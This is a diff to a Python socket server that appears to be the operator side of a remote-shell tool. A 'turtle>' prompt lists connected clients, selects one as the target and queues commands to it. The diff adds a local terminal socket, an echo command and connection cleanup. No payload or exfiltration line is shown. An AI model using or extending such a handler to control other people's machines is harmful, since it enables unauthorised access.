@@ -70,17 +70,13 @@ def bind_socket():
 
 
 
-
-
-
-
 # Handling connection from multiple cilents and saving to list
 # Closing previous connections when server.py file is restarted
 
 def accepting_connection():
 
     while inputs:
-        readable, writable, exceptional = select.select(inputs, outputs, inputs)
+        readable, writable, exceptional = select.select(inputs, outputs, inputs,5)
         lock.acquire()
            
         for s in readable:
@@ -92,6 +88,8 @@ def accepting_connection():
                 connection.setblocking(0)
                 inputs.append(connection)
                 message_queues[connection] = Queue.Queue()
+            #elif s is terminal:
+            #    print("Terminal read")
             else:
                 data = s.recv(1024)
                 if data:
@@ -109,6 +107,10 @@ def accepting_connection():
                     del message_queues[s]
     
         for s in writable:
+
+            if s is terminal:
+                print("Terminal write")
+
             try:
                 next_msg = message_queues[s].get_nowait()
             except Queue.Empty:
@@ -169,11 +171,28 @@ def accepting_connection():
 
 # custom shell
 def start_turtle():
+
+    # create AF_UNIX socket
+    s1, s2 = socket.socketpair()
+    global terminal
+    
+    
+    # add socket to TCP server
+    terminal = s2
+    inputs.append(terminal)
+
+    # keep socket to communicate
+    global terminal_socket
+    terminal_socket = s1
+
     while True:
         cmd = input('turtle>')
 
         if cmd == 'list':
             list_connections()
+
+        elif 'echo' in cmd:
+            echo_message(cmd)
 
         # TODO: add 'select all' feature   
         elif 'select' in cmd:
@@ -186,7 +205,9 @@ def start_turtle():
 
 
 
-
+def echo_message(cmd):
+    action = cmd.replace('echo ', '')
+    terminal_socket.sendall(str.encode(action+"\n"))
 
 # Display all current active connection with the clients
 
@@ -196,7 +217,7 @@ def list_connections():
     print("connection size: " + str(len(inputs)))
     for i, conn in enumerate(inputs):
         try:
-            if conn is server:
+            if (conn is server) or (conn is terminal):
                 continue
             print("pinging " + str(i))
             conn.send(str.encode(' '))
@@ -204,6 +225,8 @@ def list_connections():
         except:
             print("ping failed to user")
             del inputs[i]
+            if conn in outputs:
+                outputs.remove(conn)
             #del all_addresses[i]
             continue
         
@@ -222,7 +245,7 @@ def get_target(cmd):
         target = int(target) # cast to int
         conn = inputs[target]
         print("you are now connected to " + str(inputs[target].getpeername()[0]))
-        print(str(inputs[target].getpeername()[0]) + ">", end="") # format prompt
+        print(str(inputs[target].getpeername()[0]) +":"+ str(inputs[target].getpeername()[1]) + ">", end="") # format prompt
 
         return conn
 
@@ -255,13 +278,15 @@ def send_target_command(conn):
                 
 
                 msg = cmd+"\n"
-                send_message(conn, msg)
+                #send_message(conn, msg)
                 #conn.sendall(msg)
 
+
+
                 #str.encode(cmd+"\n")
-                #message_queues[conn].put(str.encode("test\n"))
-                #if conn not in outputs:
-                #    outputs.append(conn)
+                message_queues[conn].put(str.encode("test\n"))
+                if conn not in outputs:
+                    outputs.append(conn)
                 
 
 
